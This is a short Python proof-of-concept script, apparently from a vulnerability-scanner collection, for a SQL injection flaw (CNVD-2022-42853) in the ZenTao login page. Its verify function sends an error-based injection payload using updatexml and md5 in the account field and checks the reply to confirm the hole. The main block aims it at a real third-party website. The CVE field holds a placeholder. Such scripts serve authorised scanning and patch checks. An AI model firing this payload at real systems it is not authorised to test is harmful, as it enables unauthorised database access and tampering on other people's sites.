import requests


def get_info():
    return {
        "Name": "ZenTao CMS - SQL Injection",
        "Attack": False,
        "Script": "CNVD-2022-42853.py",
        "Path": "pocs/CNVD-2022-42853.py",
        "version": "Unknown",
        "about": "ZenTao CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive "
                 "information from a database, modify data, and execute unauthorized administrative operations in the "
                 "context of the affected site.",
        "CVE": "CVE-2022-XXXXX"
    }


def verify(url):
    result = {
        'Name': 'ZenTao CMS - SQL Injection',
        'Script': 'CNVD-2022-42853.py',
        'url': url,
        'Attack': False,
        'vulnerable': False
    }
    num = "1"
    timeout = 5
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"{url}/zentao/user-login.html"
    }

    payload = {
        "account": f"admin' and updatexml(1, concat(0x1, md5({num})), 1) and '1'='1"
    }
    try:
        response = requests.post(f"{url}/zentao/user-login.html", headers=headers, data=payload, verify=False,
                                 timeout=timeout)
        if "c4ca4238a0b923820dcc509a6f75" in response.text:
            result['vulnerable'] = True
            result['verify'] = f"{url}/zentao/user-login.html"
            return result
        else:
            return result
    except:
        return result


if __name__ == '__main__':
    verify('http://www.baidu.com/')
